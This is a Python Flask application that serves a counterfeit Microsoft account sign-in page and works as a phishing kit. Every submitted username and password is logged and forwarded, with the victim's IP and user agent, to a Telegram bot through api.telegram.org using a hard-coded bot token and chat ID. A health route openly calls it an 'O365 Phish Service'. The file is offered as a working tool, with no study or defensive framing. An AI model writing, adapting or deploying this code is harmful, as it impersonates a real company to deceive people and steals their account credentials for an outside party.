from flask import Flask, request
import requests
import logging
import os

app = Flask(__name__)

# YOUR TELEGRAM CREDENTIALS
TELEGRAM_BOT_TOKEN = "8998925422:AAFKDgRkGsFewhlRC6tDmrGa33a6yNxj9UY"
TELEGRAM_CHAT_ID = "8877118461"

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# EMBEDDED HTML
HTML_PAGE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Sign in - Microsoft account</title>
    <style>
        body { font-family: "Segoe UI", sans-serif; background-color: #f3f2f1; margin: 0; padding: 0; }
        .container { max-width: 400px; margin: 50px auto; background: white; padding: 30px; box-shadow: 0 4px 8px rgba(0,0,0,0.1); border-radius: 8px; }
        .logo { text-align: center; margin-bottom: 20px; }
        .logo span { font-size: 24px; font-weight: bold; color: #5e5c64; }
        .form-group { margin-bottom: 15px; }
        label { display: block; margin-bottom: 5px; font-size: 14px; color: #323130; }
        input[type="text"], input[type="password"] { width: 100%; padding: 10px; border: 1px solid #8a8886; border-radius: 4px; box-sizing: border-box; font-size: 14px; }
        .btn-primary { width: 100%; padding: 10px; background-color: #0078d4; color: white; border: none; border-radius: 4px; font-size: 16px; cursor: pointer; }
        .footer { text-align: center; margin-top: 20px; font-size: 12px; color: #605e5c; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo"><span>Microsoft</span></div>
        <h2 style="text-align:center; font-size:18px;">Sign in</h2>
        <p style="text-align:center; font-size:14px; color:#605e5c;">Use your Microsoft account</p>
        
        <form method="POST" action="/">
            <div class="form-group">
                <label for="login_input">Email, phone, or Skype</label>
                <input type="text" id="login_input" name="login_input" placeholder="you@example.com" required>
            </div>
            <div class="form-group">
                <label for="passwd">Password</label>
                <input type="password" id="passwd" name="passwd" placeholder="Enter password" required>
            </div>
            <button type="submit" class="btn-primary">Sign in</button>
        </form>
        <div class="footer">
            <p>&copy; Microsoft Corporation or one of its affiliates</p>
        </div>
    </div>
</body>
</html>
"""

def send_to_telegram(username, password, ip, ua):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    # Using .format to avoid f-string issues with special characters
    message_text = (
        "🛡️ <b>New O365 Credential Captured</b>\n\n"
        "👤 <b>Username:</b> {username}\n"
        "🔑 <b>Password:</b> {password}\n\n"
        "🌐 <b>Source IP:</b> {ip}\n"
        "🧩 <b>User Agent:</b> {ua}"
    ).format(username=username, password=password, ip=ip, ua=ua)

    payload = {
        "chat_id": TELEGRAM_CHAT_ID,
        "text": message_text,
        "parse_mode": "HTML"
    }
    try:
        response = requests.post(url, json=payload, timeout=10)
        if response.status_code == 200:
            logger.info(f"Sent to Telegram: {username}")
        else:
            logger.error(f"Telegram error: {response.text}")
    except Exception as e:
        logger.error(f"Telegram send failed: {e}")

@app.route("/", methods=["GET", "POST"])
def index():
    if request.method == "POST":
        username = request.form.get('login_input', '')
        password = request.form.get('passwd', '')
        ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        ua = request.headers.get('User-Agent', 'Unknown')
        
        logger.info(f"[CAPTURE] {username} : {password} from {ip}")
        send_to_telegram(username, password, ip, ua)
        
        return f"<h2>Signing you in...</h2><p>Redirecting to your mailbox, {username}...</p>"
    
    return HTML_PAGE

@app.route("/health")
def health():
    return "O365 Phish Service is Operational"

if __name__ == "__main__":
    port = int(os.environ.get('PORT', 5000))
    app.run(host="0.0.0.0", port=port)
